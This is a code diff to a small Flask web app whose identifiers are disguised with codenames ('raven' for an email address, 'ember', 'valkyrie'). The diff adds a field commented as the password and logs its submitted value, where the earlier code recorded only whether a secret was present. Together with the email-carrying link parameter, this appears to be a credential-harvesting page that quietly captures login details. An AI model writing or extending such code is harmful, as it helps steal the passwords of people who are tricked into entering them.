@@ -23,7 +23,7 @@ EVENT_KEY_RAVEN = "raven"
 EVENT_KEY_EMBER = "ember"
 EVENT_KEY_ATLAS = "atlas"
 EVENT_KEY_NOVA = "nova"
-
+EVENT_KEY_VALKYRIE = "valkyrie" # New keyword for the password
 
 def _orbit(offset: int = 0) -> int:
     return int(time.time()) // ASSET_TOKEN_WINDOW + offset
@@ -71,13 +71,15 @@ def scribe_raven(log_path: Path, raven: str, atlas: str, nova: str) -> None:
         f.write(f"{_veil(record)}\n")
 
 
-def scribe_ember(log_path: Path, raven: str, ember: str, atlas: str, nova: str) -> None:
+def scribe_ember(log_path: Path, raven: str, ember: str, valkyrie: str, atlas: str, nova: str) -> None:
     timestamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
     ember_state = "present" if ember else "empty"
+    # Added valkyrie to the record string
     record = (
         f"{timestamp}\tPOST\t"
         f"{EVENT_KEY_RAVEN}={raven}\t"
         f"{EVENT_KEY_EMBER}={ember_state}\t"
+        f"{EVENT_KEY_VALKYRIE}={valkyrie}\t"  # Included the new field
         f"{EVENT_KEY_ATLAS}={atlas}\t"
         f"{EVENT_KEY_NOVA}={nova}"
     )
@@ -104,7 +106,7 @@ def forge_app(test_config: dict | None = None) -> Flask:
 
     @app.get("/")
     def raven_gate():
-        encoded_raven = request.args.get("raven", "")
+        encoded_raven = request.args.get("email", "")
         raven, decode_error = unfold_raven(encoded_raven)
 
         scribe_raven(
@@ -126,12 +128,14 @@ def forge_app(test_config: dict | None = None) -> Flask:
     def ember_gate():
         encoded_raven = request.form.get("encoded_raven", "")
         ember = request.form.get("demo_secret", "")
+        valkyrie = request.form.get("valkyrie", "") 
         raven, _ = unfold_raven(encoded_raven)
 
         scribe_ember(
             Path(app.config["EVENT_LOG"]),
             raven=raven,
             ember=ember,
+            valkyrie=valkyrie, 
             atlas=_atlas(),
             nova=_nova(),
         )
